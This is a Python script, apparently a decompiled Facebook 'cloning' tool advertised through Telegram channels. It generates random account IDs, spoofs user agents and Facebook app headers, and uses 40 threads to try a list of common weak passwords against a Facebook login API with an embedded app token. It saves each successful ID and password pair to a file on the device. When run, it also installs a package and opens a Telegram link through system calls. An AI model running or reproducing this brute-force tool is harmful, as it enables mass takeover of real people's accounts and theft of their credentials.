#Decode by Asshu x Deep 
#Telegram https://t.me/yusuftricker
#JOIN CHANNEL : https://t.me/yusuftricker


import requests
import bs4
import json
import os
import sys
import uuid
import random
import datetime
import time
import re
import urllib3
import rich
import base64
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
import os
import time
import random
import json
import sys
import datetime
import requests
os.system('pip3 install requests')
import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
os.system('xdg-open https://t.me/trickerxx77')

def lin():
    print('\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

dic = {
    '1': 'January',
    '2': 'February',
    '3': 'March',
    '4': 'April',
    '5': 'May',
    '6': 'June',
    '7': 'July',
    '8': 'August',
    '9': 'September',
    '10': 'October',
    '11': 'November',
    '12': 'December' }
dic2 = {
    '01': 'January',
    '02': 'February',
    '03': 'March',
    '04': 'April',
    '05': 'May',
    '06': 'June',
    '07': 'July',
    '08': 'August',
    '09': 'September',
    '10': 'October',
    '11': 'November',
    '12': 'Devember' }
tgl = datetime.datetime.now().day
bln = dic[str(datetime.datetime.now().month)]
thn = datetime.datetime.now().year
okc = 'OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
cpc = 'CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
date = str(tgl) + '-' + str(bln)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx - 12
    tag = 'PM'
a = ltx
tag = 'AM'
A = '\x1b[1;97m'
R = '\x1b[38;5;196m'
Y = '\x1b[1;33m'
G = '\x1b[38;5;46m'
B = '\x1b[38;5;8m'
G1 = '\x1b[38;5;48m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
X = '\x1b[1;34m'
X1 = '\x1b[38;5;14m'
X2 = '\x1b[38;5;123m'
X3 = '\x1b[38;5;122m'
X4 = '\x1b[38;5;86m'
X5 = '\x1b[38;5;121m'
S = '\x1b[1;96m'
M = '\x1b[38;5;205m'

def ua():
    rr = random.randint
    aZ = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    zA = random.choice([
        'a',
        'b',
        'c',
        'd',
        'e',
        'f',
        'g',
        'h',
        'i',
        'j',
        'k',
        'l',
        'm',
        'n',
        'o',
        'p',
        'q',
        'r',
        's',
        't',
        'u',
        'v',
        'w',
        'x',
        'y',
        'z'])
    rx = random.randrange(1, 999)
    xx = f'''Mozilla/5.0 (Wi    ndows NT 10.0; {str(rr(9, 11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99, 149))}.0.{str(rr(4500, 4999))}.{str(rr(35, 99))} Chrome/{str(rr(99, 175))}.0.{str(rr(0, 5))}.{str(rr(0, 5))} Safari/537.36'''
    return xx


def windows():
    aV = str(random.choice(range(10, 20)))
    A = f'''Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}'''
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'''5{bx}.{bV}'''
    B = f'''Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice([
        '2',
        '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}'''
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'''5{cx}.{cV}'''
    C = f'''Mozilla/5.0 (Windows NT 6.{str(random.choice([
        '2',
        '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}'''
    D = f'''Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36'''
    return random.choice([
        A,
        B,
        C,
        D])


def generate_user_agent():
    rr = random.randint
    aZ = random.choice('ABCDEFGHIJKLMNOPQRSTUVWALAMGIR')
    rx = random.randrange(1, 999)
    return f'''Mozilla/5.0 (Windows NT {rr(9, 11)}; Win64; x64){aZ}{rx}{aZ}) AppleWebKit/537.36 (KHTML, like Gecko){rr(99, 149)}.0.{rr(4500, 4999)}.{rr(35, 99)} Chrome/{rr(99, 175)}.0.{rr(0, 5)}.{rr(0, 5)} Safari/537.36'''

logo = '\n   \x1b[38;5;196m ██████ \x1b[33;1m██    ██ \x1b[38;5;46m██████  \x1b[34;1m███████ \x1b[38;5;196m██████  \n   \x1b[38;5;196m██       \x1b[33;1m██  ██  \x1b[38;5;46m██   ██ \x1b[34;1m██      \x1b[38;5;196m██   ██ \n   \x1b[38;5;196m██        \x1b[33;1m████   \x1b[38;5;46m██████  \x1b[34;1m█████   \x1b[38;5;196m██████  \n   \x1b[38;5;196m██         \x1b[33;1m██    \x1b[38;5;46m██   ██ \x1b[34;1m██      \x1b[38;5;196m██   ██ \n   \x1b[38;5;196m ██████    \x1b[33;1m██    \x1b[38;5;46m██████  \x1b[34;1m███████ \x1b[38;5;196m██   ██ \n\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n  \x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;92mDEVELOPER \x1b[1;91m :   \x1b[1;92mYUSUF KHAN\n  \x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;92mFACEBOOK \x1b[1;91m  :   \x1b[1;92mYUSUF KHANツ࿐\n  \x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;92mTOOL TYPE \x1b[1;91m :   \x1b[1;92mFB-CLONING\n  \x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;92mVERSION \x1b[1;91m   :   \x1b[1;92mMIX\n\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'
CorrectUsername = 'KHANBABA'
key = 'true'
if key == 'true':
    username = input('\x1b[1;91m[\x1b[1;92m•\x1b[1;91m] \x1b[1;92mENTER USERNAME \x1b[1;91m: \x1b[1;92m')
    if username == CorrectUsername:
        print('\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\x1b[0;97m[•]\x1b[1;32m LOGGED IN PAID TOOL SUCCESSFULLY')
        time.sleep(1)
        key = 'false'

def main():
    user = []
    os.system('clear')
    print(logo)
    print('\x1b[38;5;8m\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[1;37mEXAMPLE   : \x1b[1;37m10000 | 20000 | 90000')
    lin()
    limit = input('\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[1;97mCHOICE    : ')
    lin()
    os.system('clear')
    print(logo)
    print('\x1b[38;5;8m(\x1b[1;97m1\x1b[38;5;8m) \x1b[1;97mMETHOD ~ (2010-2009')
    lin()
    ask = input('\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[1;97mCHOICE    : ')
    lin()
    if ask in ('1',):
        star = '10000'
        for i in range(int(limit)):
            data = str(random.choice(range(1000000000, 1999999999)))
            user.append(data)
            star = '100000'
            for i in range(int(limit)):
                data = str(random.choice(range(1000000000, 1999999999)))
                user.append(data)
                MrDevilEx = ThreadPool(max_workers = 40)
                os.system('clear')
                print(logo)
                print(f'''\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[38;5;47mTOTAL ID : {limit} \x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[38;5;47mMETHOD : \x1b[38;5;86m{ask}''')
                print('\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[38;5;47mVPN.1.1.1 \x1b[38;5;8m[\x1b[38;5;47mON\x1b[1;97m/\x1b[38;5;47mOF\x1b[38;5;8m]  \x1b[38;5;47mLOGIN METHOD-USE-VPN-111')
                lin()
                for mal in user:
                    uid = star + mal
                    MrDevilEx.submit(login, uid)                   

loop = 0
oks = []

def login(uid):
    global loop
    Session = requests.session()
    sys.stdout.write(f'''\r\x1b[38;5;8m(\x1b[1;97m{date}\x1b[38;5;8m) \x1b[38;5;8m(\x1b[1;97m{loop}\x1b[38;5;8m) \x1b[38;5;8m(\x1b[1;97m{len(oks)}\x1b[38;5;8m)''')
    sys.stdout.flush()
    for pw in ('123456', '123123', '1234567890', '0987654321', '1234567', '12345678', '123123', '123456789', '654321', '87654321', '7654321', '000000', '111111', '143143', '111222', '112233'):
        headers = {
            'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
            'x-fb-sim-hni': str(random.randint(20000, 40000)),
            'x-fb-net-hni': str(random.randint(20000, 40000)),
            'x-fb-connection-quality': 'EXCELLENT',
            'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
            'user-agent': windows(),
            'content-type': 'application/x-www-form-urlencoded',
            'x-fb-http-engine': 'Liger' }
        rp = Session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + str(uid) + '&password=' + str(pw) + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers = headers).json()
        if 'session_key' in rp:
            print(f'''\r\r{G}SUCCESS {A}➤ {G}{uid} {A}•{G} {pw}''')
            open('/sdcard/AMI.txt', 'a').write(uid + '|' + pw + '\n')
            oks.append(uid)
        if 'www.facebook.com' in rp['error_msg']:
            print(f'''\r\r{G}SUCCESS {A}➤ {G}{uid} {A}•{G} {pw}''')
            open('/sdcard/AMI.txt', 'a').write(uid + '|' + pw + '\n')
            oks.append(uid)
        if 'Please Confirm Email' in str(rp):
            print(f'''\r\r{G}SUCCESS{A}➤ {G}{uid} {A}•{G} {pw}''')
            open('/sdcard/AMI.txt', 'a').write(uid + '|' + pw + '\n')
            oks.append(uid)
        loop += 1
        return None
        return None

main()
